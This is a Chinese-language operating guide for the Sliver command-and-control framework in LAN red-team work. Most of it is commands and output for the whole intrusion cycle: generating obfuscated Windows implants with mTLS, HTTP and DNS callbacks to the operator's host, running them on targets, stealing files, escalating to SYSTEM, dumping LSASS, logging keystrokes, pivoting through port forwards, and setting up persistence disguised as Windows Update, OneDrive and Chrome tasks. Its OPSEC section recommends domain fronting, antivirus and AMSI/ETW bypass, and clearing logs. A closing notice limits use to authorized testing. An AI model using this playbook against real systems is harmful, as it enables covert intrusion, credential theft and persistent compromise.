# Sliver C2 v1.7.7 - 局域网红队实战操作指南

> **版本**: v1.7.7 (2026-09-03)  
> **架构**: Windows AMD64  
> **项目**: https://github.com/BishopFox/sliver  
> **官方文档**: https://sliver.sh/docs/

---

## 📁 目录结构
```
sliver-c2/
├── sliver-server.exe   # C2 团队服务器 (325 MB)
├── sliver-client.exe   # 操作员控制台 (65 MB)
└── data/               # 运行时生成: 证书、数据库、日志
```

---

## 🏗️ 架构总览
```
┌─────────────────┐     mTLS/WireGuard      ┌──────────────────┐
│  sliver-client  │ ◄──────────────────────► │  sliver-server   │
│  (操作员控制台)  │                         │  (团队服务器/C2)  │
└────────┬────────┘                         └────────┬─────────┘
         │                                           │
         │ generate implant.exe                      │
         ▼                                           ▼
┌─────────────────┐                         ┌──────────────────┐
│   implant.exe   │ ◄────── mTLS/HTTP/DNS ──► │   目标主机       │
│   (被控端/植入)  │                         │   (Windows/Linux)│
└─────────────────┘                         └──────────────────┘
```

---

## 🚀 快速开始 (5 分钟上线)

### 1️⃣ 终端 A - 启动团队服务器
```powershell
cd D:\my-project\Gh0st项目\sliver-c2

# 前台运行 (可看日志，适合调试)
.\sliver-server.exe daemon --lhost 0.0.0.0 --lport 31337

# 后台守护进程 (生产环境)
# .\sliver-server.exe daemon --lhost 0.0.0.0 --lport 31337 --force
```

**首次启动输出关键信息（必须记录）：**
```
[*] Starting Sliver server v1.7.7
[*] Multiplayer listener: 0.0.0.0:31337
[*] Operator username: operator
[*] Operator password: xK9mP2qR8vL5nT3w   ← 这个密码仅显示一次！
[*] Database: ./data/sliver.db
[*] CA certificate: ./data/ca.crt
```

> ⚠️ **密码只显示一次**，截图保存或立即记录。丢失需删除 `data/` 重新初始化。

---

### 2️⃣ 终端 B - 连接控制台
```powershell
cd D:\my-project\Gh0st项目\sliver-c2

# 基础连接
.\sliver-client.exe --connect 127.0.0.1:31337 --username operator --password 'xK9mP2qR8vL5nT3w'

# 或使用配置文件 (推荐，避免明文密码)
.\sliver-client.exe import --source ./data/operator.cfg
.\sliver-client.exe console
```

成功进入交互式 Shell：
```
sliver >
```

---

### 3️⃣ 生成被控端
```bash
# 基础生成 (mTLS, 需目标能直连服务器IP)
sliver > generate --mtls 192.168.1.100 --save ./implant.exe --os windows --arch amd64

# HTTP 代理模式 (适合目标只能走 HTTP 出站)
sliver > generate --http 192.168.1.100:8080 --save ./implant_http.exe --os windows --arch amd64

# DNS 隧道模式 (高隐蔽)
sliver > generate --dns c2.example.com --save ./implant_dns.exe --os windows --arch amd64

# 免杀/混淆选项
sliver > generate --mtls 192.168.1.100 --save ./implant_stealth.exe --os windows --arch amd64 --obfuscate --format exe
```

**生成产物：**
```
sliver-c2/
├── implant.exe          # 标准 mTLS 被控端
├── implant_http.exe     # HTTP 被控端
├── implant_dns.exe      # DNS 被控端
└── implant_stealth.exe  # 混淆版被控端
```

---

### 4️⃣ 目标上线
将 `implant.exe` 传至目标机器执行：
```cmd
# 目标机器 (管理员权限更佳)
implant.exe
```

控制台立即显示：
```
[*] Session 1 opened (192.168.1.50:49231 -> 192.168.1.100:31337)
[*] Session ID: 1
[*] Hostname: DESKTOP-ABC123
[*] Username: user
[*] OS: windows/amd64 (10.0.19045)
[*] Arch: amd64
[*] PID: 4568
```

---

## 🎮 核心命令速查

### 会话管理
```bash
sessions                    # 列出所有会话
use 1                       # 切换到会话 1
background                  # 退回主菜单
close 1                     # 关闭会话 1
kill 1                      # 强制杀死植入体进程
```

### 系统侦察
```bash
info                        # 目标详细信息
whoami                      # 当前用户权限
netstat                     # 网络连接
ps                          # 进程列表
ls C:\Users                 # 文件列表
cat C:\Windows\System32\drivers\etc\hosts  # 读取文件
download C:\secret.txt      # 下载文件到本地
upload /root/tool.exe C:\temp\tool.exe     # 上传文件
```

### 权限提升 & 横向
```bash
getsystem                   # 尝试 SYSTEM 提权
runas <user> <pass> <cmd>   # 凭据横向
execute-assembly ./SharpView.exe --args  # 执行 .NET 程序集
shell whoami                # 执行系统命令
powershell -c "Get-LocalUser"            # 执行 PS 命令
```

### 凭证获取
```bash
dump-pid 4568               # 进程内存导出
dump-lsass                  # 导出 LSASS (需高权限)
get-keystrokes              # 键盘记录 (启动/停止)
```

### 端口转发 / 代理
```bash
# SOCKS5 代理 (配合 proxychains)
sliver > portfwd start --local 1080 --remote 127.0.0.1:1080 --server
# 本地 1080 -> 目标内网 1080 (SOCKS5)

# 单端口转发
sliver > portfwd start --local 3389 --remote 192.168.1.50:3389 --server
# 本地 3389 -> 目标内网 3389 (RDP)

# 反向端口转发
sliver > portfwd start --local 8080 --remote 192.168.1.100:80 --reverse
```

### 持久化
```bash
persist --service --name "Windows Update" --cmd "C:\temp\implant.exe"
persist --registry --key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" --value "OneDrive" --data "C:\temp\implant.exe"
persist --schtask --name "ChromeUpdate" --cmd "C:\temp\implant.exe"
```

---

## 🔧 高级用法

### 多操作员协作
```bash
# 服务端生成新操作员配置
sliver-server.exe operator --name analyst --lhost 0.0.0.0 --lport 31337 --save ./analyst.cfg

# 分发 analyst.cfg 给队友，队友导入即可连接
sliver-client.exe import --source ./analyst.cfg
sliver-client.exe console
```

### 配置文件避免明文密码
```bash
# 首次连接后自动生成 ~/.sliver/configs/default.cfg
# 或手动导出
sliver > save-config --path ./my_operator.cfg

# 后续直接用
sliver-client.exe import --source ./my_operator.cfg
sliver-client.exe console
```

### 自定义 C2 Profile (流量伪装)
```bash
# 编辑 profile
cat > profile.yaml << 'EOF'
http:
  headers:
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    Accept: "*/*"
  paths:
    - "/api/v1/telemetry"
    - "/cdn-cgi/trace"
  valid_status: [200, 404]
  kill_date: "2026-12-31"
EOF

# 生成时应用
sliver > generate --mtls 192.168.1.100 --save ./implant_custom.exe --profile ./profile.yaml
```

### 重新生成已上线植入体
```bash
sliver > regenerate --save ./implant_v2.exe SESSION_NAME
# 保留原会话 ID、密钥、配置，仅更新二进制
```

---

## 📊 监控 & 维护

### 查看服务端日志
```powershell
# 实时日志
Get-Content .\data\sliver.log -Wait -Tail 50

# 或服务端启动时加 --verbose
.\sliver-server.exe daemon --lhost 0.0.0.0 --lport 31337 --verbose
```

### 备份关键数据
```powershell
# 必须备份 (含 CA、密钥、数据库、操作员配置)
Compress-Archive -Path .\data\* -DestinationPath sliver_backup_$(Get-Date -Format 'yyyyMMdd').zip
```

### 升级版本
```powershell
# 1. 停止服务端
# 2. 备份 data/
# 3. 替换 sliver-server.exe / sliver-client.exe
# 4. 启动服务端 (自动兼容旧数据库)
.\sliver-server.exe daemon --lhost 0.0.0.0 --lport 31337
```

---

## 🛡️ OPSEC 建议 (红队实战)

| 维度 | 建议 |
|------|------|
| **通信加密** | 默认 mTLS 已足够，敏感环境加 `--mtls` + 自定义 Profile |
| **域名前置** | 使用 Cloudflare/CDN 前置域名，隐藏真实 C2 IP |
| **杀软规避** | `--obfuscate` + 自定义 shellcode loader + AMSI/ETW 绕过 |
| **流量特征** | 修改 User-Agent、JA3 指纹、心跳间隔 (`--beacon`) |
| **生命周期** | 设置 `--kill-date` 自动过期，避免失控 |
| **日志清理** | 定期清理 `data/sliver.log`，或输出到内存/远程 syslog |

---

## ❗ 常见问题排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `connection refused` | 防火墙/端口未放行 | 放行 31337 入站；目标出站策略允许 |
| `certificate verify failed` | 系统时间不同步/证书过期 | 同步时间；重新生成 CA (`rm -rf data && 重启`) |
| `session died immediately` | 杀软拦截/路径含中文/权限不足 | 白名单/重命名/以管理员运行 |
| `operator config not found` | 未导入配置/路径错误 | `sliver-client import --source ./data/operator.cfg` |
| `database locked` | 多实例共用 data 目录 | 每实例独立 `--data-dir` |

---

## 🔗 资源链接
- **官方 Wiki**: https://github.com/BishopFox/sliver/wiki
- **命令参考**: https://sliver.sh/docs/commands/
- **C2 Profiles**: https://sliver.sh/docs/advanced/c2-profiles/
- **Armory 扩展**: https://sliver.sh/armory/
- **Discord**: https://discord.gg/sliver
- **博客实战**: https://blog.bishopfox.com/category/sliver

---

## ⚖️ 法律声明
**仅限授权渗透测试、红队演练、安全研究使用。**  
未经书面授权对非受控系统部署植入体、窃取数据、横向移动等行为违反《网络安全法》《计算机信息网络安全保护管理条例》等法律法规。使用者承担全部法律责任。

---

*生成时间: 2026-09-19 | Sliver v1.7.7 | 环境: Windows 10/11 AMD64*